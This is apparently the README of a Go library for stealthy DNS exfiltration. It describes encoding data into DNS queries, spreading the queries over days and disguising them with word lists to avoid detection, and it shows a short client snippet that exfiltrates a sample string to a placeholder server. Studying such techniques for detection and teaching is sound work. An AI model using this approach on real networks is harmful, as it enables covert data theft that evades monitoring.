# DNS-Communications

DNS-Communications, a repo that performs DNS exfiltration by sending out DNS. Provides both client & server APIs

## How it works

DNS Exfiltration is nothing new, it is a technique used to extract data from a network by encoding it into DNS queries. However, traditional DNS exfiltration methods are often quite easy to detect and block.

This project aims to provide a more stealthy approach to DNS exfiltration by using a custom DNS server which can respond to real DNS queries while also allowing for the exfiltration of data in small chunks over time. The client can send data to the server by encoding it into DNS queries, which are then decoded by the server and stored for later retrieval. You can choose how stealthy you want to be by adjusting settings which let you go from "send it all at once in TXT and NULL records" to "send it in tiny chunks using real domain names and subdomains as part of a code over a few days".

A default expandible word list is provided to facilitate encoding and decoding long strings of data into DNS queries.

---

## Example

```go
var (
    client *client.Client
    err error
)

if client, err = client.NewClient(client.Config{
    Servers: []client.ServerConfig{
        {Host:"example.com", Port:53},
    },
    Stealth: client.StealthConfig{
        Duration: client.DurationConfig{
            Min: 1 * time.Second,
            Max: 5 * time.Second,
        },
        ReplaceWithWordList: true,
    },
}); err != nil {
    log.Fatal(err)
}


if err = client.Exfiltrate([]byte("Hello, World!")); err != nil {
    log.Fatal(err)
}
```

## Learning Utility

This is also a learning utility provided in the form of a web app. It shows the relationship between the exfiltrating client, the server, and provides the ability to get a packet capture of the DNS queries being sent out.